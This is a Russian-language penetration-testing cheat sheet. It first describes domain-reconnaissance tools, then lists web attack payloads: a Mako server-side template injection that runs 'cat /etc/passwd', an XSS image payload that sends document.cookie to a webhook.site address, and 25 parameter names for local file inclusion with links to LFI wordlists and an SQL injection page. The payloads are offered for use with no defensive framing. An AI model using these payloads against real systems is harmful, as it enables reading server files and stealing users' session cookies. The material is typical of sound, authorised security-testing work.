# Разведка доменных имен

https://github.com/glebarez/cero

Cero подключается к удалённым хостам и считывает доменные имена из сертификатов, предоставленных во время TLS-рукопожатия.
Сервер не ограничивается только HTTPS и может извлекать сертификаты из любого протокола, работающего через TLS (например, SMTPS) — просто укажите нужные порты для подключения.
Cero позволяет гибко указывать цели, включая доменные имена, IP-адреса и диапазоны CIDR, с полной поддержкой IPv6.

https://github.com/hakluke/hakip2host

hakip2host принимает список IP-адресов через stdin, а затем выполняет серию проверок для возврата связанных доменных имен.

- DNS PTR-поиски
- Альтернативные имена субъектов (SAN) в SSL-сертификатах
- Общие имена (CN) в SSL-сертификатах

https://github.com/projectdiscovery/httpx

httpx— это быстрый и многоцелевой HTTP-инструментарий, позволяющий запускать несколько тестов с помощью библиотеки retryablehttp . Он разработан для обеспечения надёжности результатов при увеличении числа потоков.

https://github.com/xnl-h4ck3r/waymore

Идея waymore заключается в том, чтобы найти еще больше ссылок с помощью Wayback Machine, чем с помощью других существующих инструментов.

👉 Самое большое отличие waymore от других инструментов заключается в том, что он также может загружать архивные ответы для URL-адресов на wayback machine, чтобы вы могли затем искать в них еще больше ссылок, комментариев разработчиков, дополнительных параметров и т. д. и т. п. 👉 Кроме того, другие инструменты в настоящее время не справляются с ограничением скорости, которое сейчас устанавливают источники, и часто просто останавливаются с неполными результатами и не сообщают вам об этом.



# SSTI (Server-Side Template Injection) в Python

##  Mako Templates
### Проверка уязвимости
${7*7}  # → 49

### Чтение файла
<% import os %>${os.popen('cat /etc/passwd').read()}

# XSS Payload
[<]img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;"[>]

# LFI 
## Top 25 Local File Inclusion (LFI) Parameters

?cat={payload}

?dir={payload}

?action={payload}

?board={payload}

?date={payload}

?detail={payload}

?file={payload}

?download={payload}

?path={payload}

?folder={payload}

?prefix={payload}

?include={payload}

?page={payload}

?inc={payload}

?locate={payload}

?show={payload}

?doc={payload}

?site={payload}

?type={payload}

?view={payload}

?content={payload}

?document={payload}

?layout={payload}

?mod={payload}

?conf={payload}

##  LFI Wordlists
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
# SQLi
https://www.sqlinjection.net/stacked-queries/


